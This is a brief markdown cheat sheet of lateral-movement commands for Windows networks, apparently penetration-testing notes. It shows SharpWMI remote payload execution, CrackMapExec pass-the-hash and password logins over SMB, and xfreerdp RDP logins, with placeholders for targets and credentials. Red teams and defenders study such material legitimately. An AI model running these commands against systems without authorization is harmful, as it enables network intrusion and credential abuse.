# Lateral Movement Techniques

## SharpWMI

https://github.com/GhostPack/SharpWMI

Launch payload:

```
SharpWMI.exe action=create computername=<hostname> command="C:\path\to\exe"
```

## Crackmapexec

Pass the hash of a local account, such as the local administrator account

```
cme smb <target> -u <username> -H '<NTLM_Hash>' --local-auth``
```

Password authentication with a domain account. In some environments you won't need to supply the domain name. It'll just automatically populate the field.

```
cme smb <target> -u <username> -p '<password>' -d <domain>
```

## xfreerdp

xfreerdp is usually used for lateral movement through RDP when NLA is enforced because rdesktop does not support NLA. Another plus about xfreerdp is thaty you can use an NTLM hash to authenticate.

```
xfreerdp /u:user /p:password /v:host
```